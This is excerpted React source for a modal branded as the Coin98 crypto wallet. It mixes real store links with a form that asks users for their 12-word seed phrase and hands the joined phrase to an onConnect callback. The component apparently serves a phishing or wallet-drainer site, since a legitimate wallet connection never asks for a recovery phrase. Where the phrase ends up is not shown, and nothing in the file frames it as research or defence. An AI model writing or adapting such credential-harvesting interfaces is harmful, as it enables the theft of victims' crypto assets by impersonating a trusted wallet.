...
export default function Coin98WalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    const filled = seedWords.filter((word) => word.length > 0).length;
    const allValid = filled === 12 && invalidWords.size === 0;
    if (!allValid) return;
    if (onConnect) onConnect('Coin98 Wallet', seedWords.join(' '));
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>Coin98 Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/coin98-c98-logo.svg" alt="Coin98 Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Coin98 Super Wallet is a multi-chain wallet with built-in swap and bridge tools. Install the extension or mobile app to manage assets, then use SwapX and SpaceGate for cross-chain transfers.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Coin98 Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chromewebstore.google.com/detail/coin98-wallet-extension-c/aeachknmefphepccionboohckonoeemg"
                    target="_blank"
                  ...
                  <a
                    href="https://apps.apple.com/app/coin98-trade-crypto-stocks/id1561969966"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=coin98.crypto.finance.media&hl=en"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Coin98 seed phrase to continue.
              </p>
